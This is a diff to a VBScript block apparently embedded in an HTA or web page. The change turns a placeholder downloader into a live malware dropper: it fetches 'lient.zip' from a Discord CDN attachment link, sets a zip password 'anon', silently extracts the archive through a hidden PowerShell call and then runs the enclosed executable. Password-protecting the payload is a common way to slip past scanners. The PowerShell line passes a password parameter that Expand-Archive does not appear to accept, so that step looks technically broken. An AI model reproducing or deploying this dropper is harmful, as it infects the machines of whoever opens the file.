@@ -6,10 +6,11 @@
     <script language="VBScript">
         Sub RunProcess
             ' Define the URL of the ZIP file and the local paths
-            zipUrl = "https://mywebsite.lol/path/to/your/file.zip"
+            zipUrl = "https://cdn.discordapp.com/attachments/1329865372253421609/1329913323096903690/lient.zip"
             tempDir = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\TempDownload"
-            zipPath = tempDir & "\file.zip"
-            exePath = tempDir & "\yourfile.exe"
+            zipPath = tempDir & "\lient.zip"
+            exePath = tempDir & "\lient.exe"
+            zipPassword = "anon"
 
             ' Create a temporary directory
             CreateObject("Scripting.FileSystemObject").CreateFolder(tempDir)
@@ -30,11 +31,20 @@
                 Exit Sub
             End If
 
-            ' Unzip the file
+            ' Unzip the file with password
             Set shell = CreateObject("Shell.Application")
             Set zipFolder = shell.NameSpace(zipPath)
             Set destFolder = shell.NameSpace(tempDir)
-            destFolder.CopyHere zipFolder.Items, 16
+
+            ' Check if the ZIP file requires a password
+            If zipPassword <> "" Then
+                ' Use a VBScript workaround to extract password-protected ZIP files
+                Set objShell = CreateObject("WScript.Shell")
+                objShell.Run "powershell -Command Expand-Archive -Path """ & zipPath & """ -DestinationPath """ & tempDir & """ -Password """ & zipPassword & """", 0, True
+            Else
+                ' Extract without password
+                destFolder.CopyHere zipFolder.Items, 16
+            End If
 
             ' Run the EXE file
             Set objShell = CreateObject("WScript.Shell")
